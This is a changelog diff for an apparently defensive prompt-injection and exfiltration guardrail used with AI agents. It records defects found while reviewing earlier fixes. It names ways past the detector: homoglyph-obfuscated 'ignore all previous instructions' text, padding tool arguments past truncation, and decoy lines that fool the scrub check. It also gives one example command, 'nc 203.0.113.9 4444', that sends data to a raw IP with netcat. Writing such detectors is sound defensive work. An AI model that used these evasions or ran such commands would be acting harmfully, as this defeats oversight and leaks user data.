@@ -37,11 +37,44 @@ plus operational and precision work.
   recheck was dead code, since anything reaching that stage already scored below
   the block threshold.
 
+### Security — defects found reviewing the fixes above
+A second adversarial pass over these changes found six defects *in the fixes
+themselves*; all were reproduced before being corrected:
+
+- **Accented homoglyphs defeated the unicode fix.** Folding ran before combining
+  marks were stripped, so `Ignόrё ӑll prёviόus instructiόns` scored 0.011 and was
+  allowed. Stripping now runs first (1.000, blocked).
+- **Padded tool arguments hid the injection.** The argument path truncated where
+  the content path fails closed; 100k chars of benign padding dropped a payload
+  to 0.14. Arguments now fail closed identically.
+- **A decoy line defeated the ineffective-scrub check.** The rule keyed on "was a
+  line removed", so a removable decoy paired with an unremovable injection passed.
+  The check is now "is the content still flagged after scrubbing".
+- **Scheme-less IP literals were invisible** to the universal exfiltration rule
+  (`nc 203.0.113.9 4444`); IPv4/IPv6 literals are now extracted.
+- **Dotted filenames read as destinations.** `data.csv` / `analytics.orders` were
+  treated as external hosts (and the pattern could backtrack quadratically). Host
+  matching is now bounded, single-quantifier-per-label, and gated on a curated
+  public-suffix set.
+- **`Decision.exfiltrated` was hard-coded False for non-egress tools**, so shell
+  exfiltration could never appear in the ground-truth leak count — the exact
+  blind spot that metric exists to expose.
+
 ### Precision
 - Tightened two over-broad `_MAL_PAYLOAD` alternations that blocked legitimate
   business text ("forward every invoice…", "disable the legacy safety interlock…").
   Both now require genuinely attack-shaped objects. 0 false positives on the
   benign probe set, 0 missed guardrail attacks.
+- The soft hyphen no longer counts as an obfuscation signal (it appears in
+  ordinary hyphenated text); it is still stripped during normalisation, so using
+  it to break a keyword gains an attacker nothing.
+
+### Performance
+- The scrubber recomputed its per-line normalisation once **per pattern**; now
+  computed once per line (concurrent throughput back to ~250% over baseline).
+- `_SPACED` no longer matches across newlines, making `normalize_text`
+  line-independent — which is what makes the scrubber's whole-text prefilter a
+  *provably* sound superset of its per-line scan rather than an empirical one.
 
 ### Added
 - `Telemetry.prometheus()` (text exposition format) and `Telemetry.health()` for
